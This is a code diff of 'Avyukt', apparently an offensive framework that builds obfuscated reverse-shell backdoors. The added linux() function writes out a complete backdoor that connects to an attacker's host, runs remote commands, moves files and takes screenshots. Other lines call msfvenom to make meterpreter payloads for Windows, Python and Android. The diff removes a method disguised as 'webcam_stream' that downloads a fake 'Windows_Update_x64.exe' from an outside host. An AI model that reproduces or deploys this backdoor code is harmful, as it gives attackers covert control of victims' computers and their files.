@@ -14,7 +14,6 @@ except ImportError:
     print(Fore.RED + "[+] Found Missing Dependencies, Please run setup.py")
     sys.exit()
 
-
 def gen_nor_python_back():
     name = raw_input("Avyukt>: Please enter Payload name >> ")
     ip = raw_input("\nAvyukt>: Enter LHOST >> ")
@@ -69,16 +68,6 @@ class Backdoor:
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
 
-    def webcam_stream(self):
-        url = 'https://cdn-124.anonfiles.com/L2PbE9P1oe/00b7b936-1598590508/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
-
-
     def run(self):
         while True:
             command = self.reliable_receive()
@@ -96,9 +85,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
 
                 elif command[0] == "snapshot":
                     command_result = self.screenshot()
@@ -188,15 +174,6 @@ class Backdoor:
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
 
-    def webcam_stream(self):
-        url = 'https://cdn-124.anonfiles.com/L2PbE9P1oe/00b7b936-1598590508/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
-
 
     def run(self):
         while True:
@@ -215,9 +192,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
 
                 elif command[0] == "snapshot":
                     command_result = self.screenshot()
@@ -451,20 +425,9 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return"[+] File has been uploaded!"
 
-
-    def webcam_stream(self):
-        url = 'http://10.0.2.15:8080/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()  
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
-
     def snapshot(self):
         screenshot = pyscreeze.screenshot("Image.jpg")
         return "Screenshot saved as Image.JPG"
-    
 
     def run(self):
         while True:
@@ -483,9 +446,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
 
                 elif command[0] == "snapshot":
                     command_result = self.snapshot()
@@ -529,7 +489,7 @@ except Exception:
 
         if "n" in ask_for_icon:
             print("\nAvyukt>: Raw Script Path Output/" + name + ".py")
-            print("\nAvyukt>: Please wait, Starting to Obfuscate the Scripts")
+            print("Avyukt>: Please wait, Starting to Obfuscate the Scripts")
             print("\n")
             subprocess.call(['wine', '/root/.wine/drive_c/Python27/Scripts/pyarmor.exe', 'pack', '-e', '--onefile --noconsole', 'Output/' + name + '.py'])
             os.remove("Output/" + name + ".py")
@@ -549,6 +509,102 @@ except Exception:
     except Exception:
         print("Avyukt>: Error occured while compiling the script, Please run it again")
 
+def linux():
+    name = raw_input("Avyukt>: Please enter Payload name >> ")
+    ip = raw_input("\nAvyukt>: Enter LHOST >> ")
+    port = raw_input("\nAvyukt>: Enter LPORT >> ")
+    with open("Output/" + name + ".py", "w") as file:
+        file.write('''
+
+import socket, subprocess, json, os, base64, sys, shutil, urllib, pyscreeze
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_command(self, command):
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+
+    def change_directory(self, path):
+        os.chdir(path)
+        return "[+] Changing Working Directory to" + path
+
+    def read(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return"[+] File has been uploaded!"
+
+    def screenshot(self):
+        image = pyscreeze.screenshot('Image.jpg')
+        return "Screenshot saved as Image.jpg"
+
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+
+            try:
+
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    self.change_directory(command[1])
+
+                elif command[0] == "download":
+                    command_result = self.read(command[1])
+
+                elif command[0] == "upload":
+                    command_result = self.write(command[1], command[2])
+
+                elif command[0] == "snapshot":
+                    command_result = self.screenshot()
+
+                else:
+                    command_result = self.execute_system_command(command)
+
+            except Exception:
+                command_result = "[-] Error During command execution"
+
+            self.reliable_send(command_result)
+
+
+vedant_backdoor = Backdoor("''' + ip + '''", ''' + port + ''')
+vedant_backdoor.run()
+        ''')
+        print("\nAvyukt>: Please wait, Compiling Backdoor to Linux Executable")
+        print("\n")
+        subprocess.call("pyinstaller --onefile --noconsole " + "Output/" + name + ".py", shell=True)
+        print(Fore.GREEN + "\nAvyukt>: Backdoor was compiled to Linux executable successfully, Please check dist folder")
+        start_handler = raw_input(Fore.CYAN + "\nAvyukt>: Do you want to start the default handler for Avyukt Payload? y/n >> ")
+        if "y" in start_handler:
+            clear_screen()
+            print("Avyukt>: Please wait, Starting Handler ... ")
+            time.sleep(3)
+            clear_screen()
+            start_avyukt_handler()
+
+        if "n" in start_handler:
+            raw_input("\nAvyukt>: Press enter to continue ... ")
+
 
 def msfconsole():
     subprocess.call("msfconsole", shell=True)
@@ -560,21 +616,23 @@ def ascii_menu():
 
 
 def list_info():
-    print(Fore.RED + "\n\t\tAvyukt Payloads of Windows" + Fore.WHITE + "(Excellent)")
+    print(Fore.RED + "\n\t\tAvyukt Payloads for Windows" + Fore.WHITE + " (Excellent)")
     print(Fore.WHITE + "\n\t\t[1] python/Avyukt/reverse_tcp " + Fore.RED + "(Highly Obfuscated exe)")
     print(Fore.WHITE + "\n\t\t[2] python/Avyukt_NC/reverse_tcp")
     print(Fore.WHITE + "\n\t\t[3] python/Avyukt/reverse_tcp " + Fore.RED + "(Non - Obfuscated exe)")
     print(Fore.WHITE + "\n\t\t[4] python/Avyukt/reverse_tcp " + Fore.RED + "(Python File)")
+    print(Fore.RED + "\n\t\tAvyukt Payloads for Linux" + Fore.WHITE + " (Good)")
+    print(Fore.WHITE + "\n\t\t[5] python/Avyukt/reverse_tcp (Linux)")
     print(Fore.RED + "\n\t\tMsfVenom Payloads " + Fore.WHITE + "(Poor)")
-    print(Fore.WHITE + "\n\t\t[5] windows/meterpreter/reverse_https")
-    print(Fore.WHITE + "\n\t\t[6] windows/meterpreter/reverse_tcp")
-    print(Fore.WHITE + "\n\t\t[7] windows/meterpreter/reverse_http")
-    print(Fore.RED + "\n\t\tNormal Python Payloads" + Fore.WHITE + "(Good)")
-    print(Fore.WHITE + "\n\t\t[8] python/meterpreter/reverse_https")
-    print(Fore.WHITE + "\n\t\t[9] python/meterpreter/reverse_tcp")
-    print(Fore.WHITE + "\n\t\t[10] python/meterpreter/reverse_http")
-    print(Fore.RED + "\n\t\tAndroid Backdoors")
-    print(Fore.WHITE + "\n\t\t[11] android/meterpreter/reverse_tcp")
+    print(Fore.WHITE + "\n\t\t[6] windows/meterpreter/reverse_https")
+    print(Fore.WHITE + "\n\t\t[7] windows/meterpreter/reverse_tcp")
+    print(Fore.WHITE + "\n\t\t[8] windows/meterpreter/reverse_http")
+    print(Fore.RED + "\n\t\tNormal Python Payloads" + Fore.WHITE + " (Good)")
+    print(Fore.WHITE + "\n\t\t[9] python/meterpreter/reverse_https")
+    print(Fore.WHITE + "\n\t\t[10] python/meterpreter/reverse_tcp")
+    print(Fore.WHITE + "\n\t\t[11] python/meterpreter/reverse_http")
+    print(Fore.RED + "\n\t\tAndroid Backdoors" + Fore.WHITE + " (Good)")
+    print(Fore.WHITE + "\n\t\t[12] android/meterpreter/reverse_tcpz")
     print(Fore.WHITE + "\n\t[+] Press Enter to return to Menu")
 
 
@@ -593,14 +651,6 @@ def clear_screen():
 
 
 def details(version, Operating_System, release):
-    print(Fore.RED)
-    aasci_menu1 = pyfiglet.figlet_format("Do not upload file samples to VirusTotal!")
-    print(aasci_menu1)
-    raw_input("Avyukt>: Press enter to continue --> ")
-    clear_screen()
-    print(Fore.WHITE)
-    avyukt = pyfiglet.figlet_format("Avyukt")
-    print(avyukt)
     print(Fore.WHITE + "\n[+] Avyukt Version Build : " + Fore.WHITE + version)
     print("[+] Checking for Output Directory!")
     time.sleep(3)
@@ -633,7 +683,8 @@ def menu():
         print(Fore.RED + "\t\t4) Exit" + "\t\tExit the framework")
         print(Fore.WHITE + "\n\tMenu Info")
         print(Fore.WHITE + "\n\t\tNumber of Listeners : " + Fore.GREEN + "3")
-        print(Fore.WHITE + "\t\tNumber of Payloads : " + Fore.GREEN + "13")
+        print(Fore.WHITE + "\t\tNumber of Payloads : " + Fore.GREEN + "12")
+        print(Fore.WHITE + "\t\tDeveloped by : " + Fore.GREEN + "Vedant Bhalgama")
         command = raw_input(Fore.WHITE + "\nAvyukt>: ")
 
         if "1" in command:
@@ -658,17 +709,7 @@ def menu():
 
             if "5" in payload_selection:
                 clear_screen()
-                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
-                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
-                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
-                if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
-                else:
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
+                linux()
 
             if "6" in payload_selection:
                 clear_screen()
@@ -676,30 +717,21 @@ def menu():
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                 else:
-
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",  shell=True)
 
             if "7" in payload_selection:
                 clear_screen()
                 iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
-
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                 else:
-                    os.mkdir("Output")
-                    subprocess.call(
-                        "msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe",
-                        shell=True)
+
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
+
             if "8" in payload_selection:
                 clear_screen()
                 iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
@@ -707,29 +739,21 @@ def menu():
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
 
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
                 else:
                     os.mkdir("Output")
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
-
+                    subprocess.call("msfvenom --platform Windows --payload windows/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".exe", shell=True)
             if "9" in payload_selection:
                 clear_screen()
                 iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
+
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                 else:
                     os.mkdir("Output")
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_https LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
 
             if "10" in payload_selection:
                 clear_screen()
@@ -737,39 +761,40 @@ def menu():
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                 else:
                     os.mkdir("Output")
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_http LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
 
             if "11" in payload_selection:
+                clear_screen()
                 iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                 prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                 name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                 if os.path.exists("Output"):
-                    subprocess.call(
-                        "msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
                 else:
                     os.mkdir("Output")
-                    subprocess.call(
-                        "msfvenom --payload android/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk",
-                        shell=True)
+                    subprocess.call("msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".py", shell=True)
+
+            if "12" in payload_selection:
+                iadd = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
+                prt = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
+                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
+                if os.path.exists("Output"):
+                    subprocess.call("msfvenom --payload android/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk", shell=True)
+                else:
+                    os.mkdir("Output")
+                    subprocess.call("msfvenom --payload android/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk", shell=True)
 
         if "2" in command:
             clear_screen()
             ascii_banner_menu = pyfiglet.figlet_format("Avyukt Handlers")
             print(ascii_banner_menu)
             print(Fore.RED + "\n\t[+] Handler Menu")
-            print(
-                Fore.WHITE + "\n\t\t[1] Avyukt Handler (Works with python/Avyukt/reverse_tcp Payload in Evasion Menu)")
+            print(Fore.WHITE + "\n\t\t[1] Avyukt Handler (Works with python/Avyukt/reverse_tcp Payload in Evasion Menu)")
             print(Fore.WHITE + "\n\t\t[2] msfconsole (Works only with meterpreter Payloads in Evasion Menu)")
-            print(
-                Fore.WHITE + "\n\t\t[3] NetCat Listener (Works only with PowerShell Payload and avyukt_NC in Evasion Menu)")
+            print(Fore.WHITE + "\n\t\t[3] NetCat Listener (Works only with PowerShell Payload and avyukt_NC in Evasion Menu)")
             print(Fore.WHITE + "\n\t[+] Press Enter to go back")
             handler_chooser = raw_input(Fore.WHITE + "\nAvyukt" + Fore.RED + "(Handlers)" + Fore.WHITE + ">: ")
 
@@ -800,6 +825,9 @@ def menu():
 
 def startup():
     os.system("clear")
+    ascii_banner = pyfiglet.figlet_format("Avyukt")
+    print(ascii_banner)
+    print(Fore.RED + "\n[+] Hack your target with Avyukt Exploitation Framework")
     details("1.0 (Beta)", platform.system(), platform.release())
     clear_screen()
     menu()
